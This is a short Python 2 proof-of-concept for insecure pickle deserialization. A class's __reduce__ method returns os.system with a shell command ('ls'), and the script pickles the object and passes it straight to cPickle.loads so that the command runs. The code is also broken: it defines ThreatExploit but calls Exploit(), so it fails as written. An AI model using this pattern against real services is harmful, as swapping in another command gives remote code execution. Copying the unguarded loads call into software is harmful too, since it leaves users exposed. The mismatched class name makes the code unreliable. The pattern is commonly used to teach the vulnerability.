import os
import cPickle


class ThreatExploit(object):
    def __reduce__(self):
        return (os.system, ('ls',))


def serialize_exploit():
    shellcode = cPickle.dumps(Exploit())
    return shellcode


def insecure_deserialize(exploit_code):
    cPickle.loads(exploit_code)


if __name__ == '__main__':
    shellcode = serialize_exploit()
    insecure_deserialize(shellcode)